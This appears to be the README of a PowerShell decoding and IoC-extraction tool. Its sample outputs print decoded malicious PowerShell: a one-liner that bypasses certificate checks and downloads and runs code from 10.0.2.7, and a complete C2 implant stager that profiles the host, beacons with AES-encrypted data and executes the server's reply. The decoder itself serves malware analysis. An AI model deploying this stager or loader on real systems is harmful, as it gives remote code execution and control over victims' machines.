# powershell-decoder

# Sample
- Decode Base64 for Input String
```bash
> deco.py -d <base64>
```

- Decode Base64 for Read File
```bash
> deco.py -f sample.txt
[+] Output Base64 Decoded
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('https://10.0.2.7:443/utag/lbg/main/prod/_bs')
```

- Decode Base64 for Read File And Output File
```bash
> deco.py -f sample.txt -o sample_deco.txt
```

- Decode Base64 for Read File And Extract IoC
```bash
> deco.py -f sample.txt -i
[+] Print IoC
url -> https://10.0.2.7:443/utag/lbg/main/prod/_bs
fqdn -> system.net <= XD
ipv4addr -> 10.0.2.7
[+] Output Base64 Decoded
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('https://10.0.2.7:443/utag/lbg/main/prod/_bs')
```

- Decode Base64 And Ungzip
```bash
> deco.py -f sample2.txt
IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('H4sIACyQmV0C/51WW1PiSBR+z6/oSuWBzEAAUcaR4gEDrqyiLKBTu5a11SQHaAndme7OKMPy3/d0Ei46Os4uT/Tpcz9ffyd3w6XSsPCuQHtDkN9YAH3BuO5RTqcg709OjBSkD1KzCQuohlsasZBqJrhPo2hMgzlpkpWjZQJry1FB055pHauTcrla8Sregffp5PCwZuPV6zdlGirgCspaimQcgZoJoUGWq/VatYbXtjVJeGDiEb/VIwVnDsui0711V5aWS4xMMf4VPJauxw8QaGLnJQ0hSCTTS8+Xy1iLqaTxbOkN2AMPKURZgaFtrQkWFcz+q58WqOy86ZoU31gI0sYeUK8nQkBvdz914bN4BtKoYpv9U98Y9mkYMj591zbXy43/AimUMT+NRDAfsu8mePXg2IguYJkLDo7qFptgA7F31mrz15uCHi1jKLjeFV0AKcFXLF1L9G6jGnro3u6l4wuOcNAY9EyKxSlVUD/MtFO/awsiBTszlK2tdRYL57aNi//fD4yp/2Jk43ovdGZopCa4Q9c7CHWu/A2EEo4QcsZ7IUbwpL0OD4TpLQa6GZ0de7+BPl1qUAVjYKUoMTg0PizH9BUD+hLwZaBlOiNZQL2JuQFvJClXEyEXZ4zTKJ1PwRkXSaVInLF3CXyqZ651N8YId/f3xIkzh9i8j8SZWD8WPxLPS49da6+8dmdbHvDgZX0/a6FRt5xsaOO7iudVj+6fV2uGaTnhfsVt2Ks4MTfhmxVX63slkxKeXeu9xm+SS9y9GlFe+gLjIGLANVbrCzFn4JJVllzB3LcxOVI6wywovuQwLPd65SX+bLeRad0hhYFmC/N8+lQq6DzRQBecsLivXXR4EkXGZv62jV05RkIrH1Sqn+3XrTPIk1KksUGYKDwxjbhMFEhuoN8kNvJjTJV6FDLcHKV4WiYyyo+PwXN62iNubIafNqNhWc6sidppQGwy5SEpIEYUjl1h7zRFgvX8y8FtdvZ69EFIUppqcuC6mBmG8c6BIpEprxWGBftcKI2FzPLnxSbo110hzUsW65M9SnfMxbtc3thaBi9MDXG+DH6DDSq1plgZNrYnvrMoouUjr0IKXxgPxaMiVyNidkmDoKB+2CBP9UOXtOI4AmzKBdPlo9onr1YnhYvzUe+ySCI2BwRQMBcu8Wf4CKD8qY67qHZc+exVKxUypBMqWW6GPPRDTgOYgESeL9p4m/Z5M6gUgY/xz8bUN6o7i2K6NTcA2cIhHdsWDqnb/nBoXmL2fkeilG4FyJ7HTpWUWqofUcbNe0rhHwBiF4k2kBAq9MAxM5FlprLMFukiXGCPPZposUg3u9cf4gMPUchoRLaZFU0eDVOkt7s2brchGrhPDU7IipjO4QDbMKFJpF/om7obJBt52hQjfIxRlJtb75vvjF9mg/I9ickpbXCwIQrycqp3e2M6R1QO4GsCSmcqZjunlkXcT6DMu+m2mznt2G5WBdkjqFgiR0hTQ5C8tsn7OLWAxTTychh301T1EiMhefmJlHg2lPoGmt72tBVgtYnZVtNfSuA0YZHu8oGIDLe1wgXjTGlJkdkzbOLEuypTKKBTFykAoqb9wV6bcWUHfMH4QbZykmYa3DOI+Yg3+RfWKnUE/NvJDuhm5TuZMBCLONHZhevY7ir3nDSf2ayx26Jpb2UhIpbxhpM0fvCSSfqDa78zHF4P/m4N/PPuqOOPbgadhhOzsPH6h2r2VRnHTVyJpGQW31H/Nvzz6oI+/HHTH3fbnD9cfr/tHtX++r1e6bJq+/SgfXlz0apfPk2bpJRw4ojdZyU6sjuDwfXAMFwOjXxL7bZYKUMTPuXY9XAiPBJIpfn2UzhIA4QQ/lc+pow8cE5YuIkMD9of0NkH29B+/A9h8GS+ltLqM+1tDWtrqKnUpWEEEJNapfILWvU3tf4FXLhUFXQMAAA='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
```

```bash
> deco.py -d H4sIACyQmV0C/51WW1PiSBR+z6/oSuWBzEAAUcaR4gEDrqyiLKBTu5a11SQHaAndme7OKMPy3/d0Ei46Os4uT/Tpcz9ffyd3w6XSsPCuQHtDkN9YAH3BuO5RTqcg709OjBSkD1KzCQuohlsasZBqJrhPo2hMgzlpkpWjZQJry1FB055pHauTcrla8Sregffp5PCwZuPV6zdlGirgCspaimQcgZoJoUGWq/VatYbXtjVJeGDiEb/VIwVnDsui0711V5aWS4xMMf4VPJauxw8QaGLnJQ0hSCTTS8+Xy1iLqaTxbOkN2AMPKURZgaFtrQkWFcz+q58WqOy86ZoU31gI0sYeUK8nQkBvdz914bN4BtKoYpv9U98Y9mkYMj591zbXy43/AimUMT+NRDAfsu8mePXg2IguYJkLDo7qFptgA7F31mrz15uCHi1jKLjeFV0AKcFXLF1L9G6jGnro3u6l4wuOcNAY9EyKxSlVUD/MtFO/awsiBTszlK2tdRYL57aNi//fD4yp/2Jk43ovdGZopCa4Q9c7CHWu/A2EEo4QcsZ7IUbwpL0OD4TpLQa6GZ0de7+BPl1qUAVjYKUoMTg0PizH9BUD+hLwZaBlOiNZQL2JuQFvJClXEyEXZ4zTKJ1PwRkXSaVInLF3CXyqZ651N8YId/f3xIkzh9i8j8SZWD8WPxLPS49da6+8dmdbHvDgZX0/a6FRt5xsaOO7iudVj+6fV2uGaTnhfsVt2Ks4MTfhmxVX63slkxKeXeu9xm+SS9y9GlFe+gLjIGLANVbrCzFn4JJVllzB3LcxOVI6wywovuQwLPd65SX+bLeRad0hhYFmC/N8+lQq6DzRQBecsLivXXR4EkXGZv62jV05RkIrH1Sqn+3XrTPIk1KksUGYKDwxjbhMFEhuoN8kNvJjTJV6FDLcHKV4WiYyyo+PwXN62iNubIafNqNhWc6sidppQGwy5SEpIEYUjl1h7zRFgvX8y8FtdvZ69EFIUppqcuC6mBmG8c6BIpEprxWGBftcKI2FzPLnxSbo110hzUsW65M9SnfMxbtc3thaBi9MDXG+DH6DDSq1plgZNrYnvrMoouUjr0IKXxgPxaMiVyNidkmDoKB+2CBP9UOXtOI4AmzKBdPlo9onr1YnhYvzUe+ySCI2BwRQMBcu8Wf4CKD8qY67qHZc+exVKxUypBMqWW6GPPRDTgOYgESeL9p4m/Z5M6gUgY/xz8bUN6o7i2K6NTcA2cIhHdsWDqnb/nBoXmL2fkeilG4FyJ7HTpWUWqofUcbNe0rhHwBiF4k2kBAq9MAxM5FlprLMFukiXGCPPZposUg3u9cf4gMPUchoRLaZFU0eDVOkt7s2brchGrhPDU7IipjO4QDbMKFJpF/om7obJBt52hQjfIxRlJtb75vvjF9mg/I9ickpbXCwIQrycqp3e2M6R1QO4GsCSmcqZjunlkXcT6DMu+m2mznt2G5WBdkjqFgiR0hTQ5C8tsn7OLWAxTTychh301T1EiMhefmJlHg2lPoGmt72tBVgtYnZVtNfSuA0YZHu8oGIDLe1wgXjTGlJkdkzbOLEuypTKKBTFykAoqb9wV6bcWUHfMH4QbZykmYa3DOI+Yg3+RfWKnUE/NvJDuhm5TuZMBCLONHZhevY7ir3nDSf2ayx26Jpb2UhIpbxhpM0fvCSSfqDa78zHF4P/m4N/PPuqOOPbgadhhOzsPH6h2r2VRnHTVyJpGQW31H/Nvzz6oI+/HHTH3fbnD9cfr/tHtX++r1e6bJq+/SgfXlz0apfPk2bpJRw4ojdZyU6sjuDwfXAMFwOjXxL7bZYKUMTPuXY9XAiPBJIpfn2UzhIA4QQ/lc+pow8cE5YuIkMD9of0NkH29B+/A9h8GS+ltLqM+1tDWtrqKnUpWEEEJNapfILWvU3tf4FXLhUFXQMAAA= -g -o sample.gzip
$sc="https://10.0.2.7:443"
$s="https://10.0.2.7:443/adsense/troubleshooter/1631343/"
function CAM ($key,$IV){
try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$a.BlockSize = 128
$a.KeySize = 256
if ($IV)
{
if ($IV.getType().Name -eq "String")
{$a.IV = [System.Convert]::FromBase64String($IV)}
else
{$a.IV = $IV}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$a.Key = [System.Convert]::FromBase64String($key)}
else
{$a.Key = $key}
}
$a}
function ENC ($key,$un){
$b = [System.Text.Encoding]::UTF8.GetBytes($un)
$a = CAM $key
$e = $a.CreateEncryptor()
$f = $e.TransformFinalBlock($b, 0, $b.Length)
[byte[]] $p = $a.IV + $f
[System.Convert]::ToBase64String($p)
}
function DEC ($key,$enc){
$b = [System.Convert]::FromBase64String($enc)
$IV = $b[0..15]
$a = CAM $key $IV
$d = $a.CreateDecryptor()
$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
[System.Text.Encoding]::UTF8.GetString($u)}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("08/10/2019","dd/MM/yyyy",$null);
if ($k -lt $d) {exit}
$username = ""
$password = ""
$proxyurl = ""
$wc = New-Object System.Net.WebClient;

$h=""
if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
elseif($h){$script:s="https://$($h)/adsense/troubleshooter/1631343/";$script:sc="https://$($h)"}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36")
$wc.Headers.Add("Referer","")
if ($proxyurl) {
$wp = New-Object System.Net.WebProxy($proxyurl,$true);
if ($username -and $password) {
$PSS = ConvertTo-SecureString $password -AsPlainText -Force;
$getcreds = new-object system.management.automation.PSCredential $username,$PSS;
$wp.Credentials = $getcreds;
} else { $wc.UseDefaultCredentials = $true; }
$wc.Proxy = $wp; } else {
$wc.UseDefaultCredentials = $true;
$wc.Proxy.Credentials = $wc.Credentials;
} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
$wc }
function primer {
$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
$ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://10.0.2.7:443"
try {$pp=enc -key 5PVdYNKajQUPbIDnnjLzVI53ZJ60Ii1DB2DLUKA6Lxg= -un $o} catch {$pp="ERROR"}
$primer = (Get-Webclient -Cookie $pp).downloadstring($s)
$p = dec -key 5PVdYNKajQUPbIDnnjLzVI53ZJ60Ii1DB2DLUKA6Lxg= -enc $primer
if ($p -like "*key*") {$p| iex}
}
try {primer} catch {}
Start-Sleep 300
try {primer} catch {}
Start-Sleep 600
try {primer} catch {}

[+] Output Base64 Decoded
b'\x1f\x8b\x08\x00,\x90\x99]\x02\xff\x9dV[S\xe2H\x14~\xcf\xaf\xe8J\xe5\x81\xcc@\x00Q\xc6\x91\xe2\x01\x03\xae\xac\xa2,\xa0S\xbb\x96\xb5\xd5$\x07h\t\xdd\x99\xee\xce(\xc3\xf2\xdf\xf7t\x12.::\xce.O\xf4\xe9s?_\x7f\'w\xc3\xa5\xd2\xb0\xf0\xae@{C\x90\xdfX\x00}\xc1\xb8\xeeQN\xa7 \xefON\x8c\x14\xa4\x0fR\xb3\t\x0b\xa8\x86[\x1a\xb1\x90j&\xb8O\xa3hL\x839i\x92\x95\xa3e\x02k\xcbQA\xd3\x9ei\x1d\xab\x93r\xb9Z\xf1*\xde\x81\xf7\xe9\xe4\xf0\xb0f\xe3\xd5\xeb7e\x1a*\xe0\n\xcaZ\x8ad\x1c\x81\x9a\t\xa1A\x96\xab\xf5Z\xb5\x86\xd7\xb65Ix`\xe2\x11\xbf\xd5#\x05g\x0e\xcb\xa2\xd3\xbduW\x96\x96K\x8cL1\xfe\x15<\x96\xae\xc7\x0f\x10hb\xe7%\r!H$\xd3K\xcf\x97\xcbX\x8b\xa9\xa4\xf1l\xe9\r\xd8\x03\x0f)DY\x81\xa1m\xad\t\x16\x15\xcc\xfe\xab\x9f\x16\xa8\xec\xbc\xe9\x9a\x14\xdfX\x08\xd2\xc6\x1eP\xaf\'B@ow?u\xe1\xb3x\x06\xd2\xa8b\x9b\xfdS\xdf\x18\xf6i\x182>}\xd76\xd7\xcb\x8d\xff\x02)\x941?\x8dD0\x1f\xb2\xef&x\xf5\xe0\xd8\x88.`\x99\x0b\x0e\x8e\xea\x16\x9b`\x03\xb1w\xd6j\xf3\xd7\x9b\x82\x1e-c(\xb8\xde\x15]\x00)\xc1W,]K\xf4n\xa3\x1az\xe8\xde\xee\xa5\xe3\x0b\x8ep\xd0\x18\xf4L\x8a\xc5)UP?\xcc\xb4S\xbfk\x0b"\x05;3\x94\xad\xadu\x16\x0b\xe7\xb6\x8d\x8b\xff\xdf\x0f\x8c\xa9\xffbd\xe3z/tfh\xa4&\xb8C\xd7;\x08u\xae\xfc\r\x84\x12\x8e\x10r\xc6{!F\xf0\xa4\xbd\x0e\x0f\x84\xe9-\x06\xba\x19\x9d\x1d{\xbf\x81>]jP\x05c`\xa5(184>,\xc7\xf4\x15\x03\xfa\x12\xf0e\xa0e:#Y@\xbd\x89\xb9\x01o$)W\x13!\x17g\x8c\xd3(\x9dO\xc1\x19\x17I\xa5H\x9c\xb1w\t|\xaag\xaeu7\xc6\x08w\xf7\xf7\xc4\x893\x87\xd8\xbc\x8f\xc4\x99X?\x16?\x12\xcfK\x8f]k\xaf\xbcvg[\x1e\xf0\xe0e}?k\xa1Q\xb7\x9clh\xe3\xbb\x8a\xe7U\x8f\xee\x9fWk\x86i9\xe1~\xc5m\xd8\xab817\xe1\x9b\x15W\xeb{%\x93\x12\x9e]\xeb\xbd\xc6o\x92K\xdc\xbd\x1aQ^\xfa\x02\xe3 b\xc05V\xeb\x0b1g\xe0\x92U\x96\\\xc1\xdc\xb719R:\xc3,(\xbe\xe40,\xf7z\xe5%\xfel\xb7\x91i\xdd!\x85\x81f\x0b\xf3|\xfaT*\xe8<\xd1@\x17\x9c\xb0\xb8\xaf]tx\x12E\xc6f\xfe\xb6\x8d]9FB+\x1fT\xaa\x9f\xed\xd7\xad3\xc8\x93R\xa4\xb1A\x98(<1\x8d\xb8L\x14Hn\xa0\xdf$6\xf2cL\x95z\x142\xdc\x1c\xa5xZ&2\xca\x8f\x8f\xc1sz\xda#nl\x86\x9f6\xa3aY\xce\xac\x89\xdai@l2\xe5!) F\x14\x8e]a\xef4E\x82\xf5\xfc\xcb\xc1mv\xf6z\xf4AHR\x9ajr\xe0\xba\x98\x19\x86\xf1\xce\x81"\x91)\xaf\x15\x86\x05\xfb\\(\x8d\x85\xcc\xf2\xe7\xc5&\xe8\xd7]!\xcdK\x16\xeb\x93=Jw\xcc\xc5\xbb\\\xde\xd8Z\x06/L\rq\xbe\x0c~\x83\r*\xb5\xa6X\x196\xb6\'\xbe\xb3(\xa2\xe5#\xafB\n_\x18\x0f\xc5\xa3"W#bvI\x83\xa0\xa0~\xd8 O\xf5C\x97\xb4\xe28\x02l\xca\x05\xd3\xe5\xa3\xda\'\xafV\'\x85\x8b\xf3Q\xef\xb2H"6\x07\x04P0\x17.\xf1g\xf8\x08\xa0\xfc\xa9\x8e\xbb\xa8v\\\xf9\xecU+\x152\xa4\x13*Yn\x86<\xf4CN\x03\x98\x80D\x9e/\xdax\x9b\xf6y3\xa8\x14\x81\x8f\xf1\xcf\xc6\xd47\xaa;\x8bb\xba57\x00\xd9\xc2!\x1d\xdb\x16\x0e\xa9\xdb\xfeph^b\xf6~G\xa2\x94n\x05\xc8\x9e\xc7N\x95\x94Z\xaa\x1fQ\xc6\xcd{J\xe1\x1f\x00b\x17\x896\x90\x10*\xf4\xc013\x91e\xa6\xb2\xcc\x16\xe9"\\`\x8f=\x9ah\xb1H7\xbb\xd7\x1f\xe2\x03\x0fQ\xc8hD\xb6\x99\x15M\x1e\rS\xa4\xb7\xbb6n\xb7!\x1a\xb8O\rN\xc8\x8a\x98\xce\xe1\x00\xdb0\xa1I\xa4_\xe8\x9b\xba\x1b$\x1by\xda\x14#|\x8cQ\x94\x9b[\xef\x9b\xef\x8c_f\x83\xf2=\x89\xc9)mp\xb0!\n\xf2r\xaaw{c:GT\x0e\xe0k\x02Jg*f;\xa7\x96E\xdcO\xa0\xcc\xbb\xe9\xb6\x9b9\xed\xd8nV\x05\xd9#\xa8X"GHSC\x90\xbc\xb6\xc9\xfb8\xb5\x80\xc54\xf2r\x18w\xd3T\xf5\x12#!y\xf9\x89\x94x6\x94\xfa\x06\x9a\xde\xf6\xb4\x15`\xb5\x89\xd9V\xd3_J\xe04a\x91\xee\xf2\x81\x88\x0c\xb7\xb5\xc2\x05\xe3LiI\x91\xd93l\xe2\xc4\xbb*S(\xa0S\x17)\x00\xa2\xa6\xfd\xc1^\x9bqe\x07|\xc1\xf8A\xb6r\x92f\x1a\xdc3\x88\xf9\x887\xf9\x17\xd6*u\x04\xfc\xdb\xc9\x0e\xe8f\xe5;\x990\x10\x8b8\xd1\xd9\x85\xeb\xd8\xee*\xf7\x9c4\x9f\xd9\xac\xb1\xdb\xa2ioe!"\x96\xf1\x86\x934~\xf0\x92I\xfa\x83k\xbf3\x1c^\x0f\xfen\r\xfc\xf3\xee\xa8\xe3\x8fn\x06\x9d\x86\x13\xb3\xb0\xf1\xfa\x87j\xf6U\x19\xc7M\\\x89\xa4d\x16\xdfQ\xff6\xfc\xf3\xea\x82>\xfcq\xd3\x1fw\xdb\x9c?\\~\xbf\xed\x1e\xd5\xfe\xfa\xbd^\xe9\xb2j\xfb\xf4\xa0}ys\xd1\xaa_>M\x9b\xa4\x94p\xe2\x88\xddg%:\xb2;\x83\xc1\xf5\xc00\\\x0e\x8d|K\xed\xb6X)C\x13>\xe5\xd8\xf5p"<\x12H\xa5\xf9\xf6S8H\x03\x84\x10\xfeW>\xa6\x8c<pNX\xb8\x89\x0c\x0f\xda\x1f\xd0\xd9\x07\xdb\xd0~\xfc\x0fa\xf0d\xbe\x96\xd2\xea3\xedm\rkk\xa8\xa9\xd4\xa5a\x04\x10\x93Z\xa5\xf2\x0bZ\xf57\xb5\xfe\x05\\\xb8T\x15t\x0c\x00\x00'
```
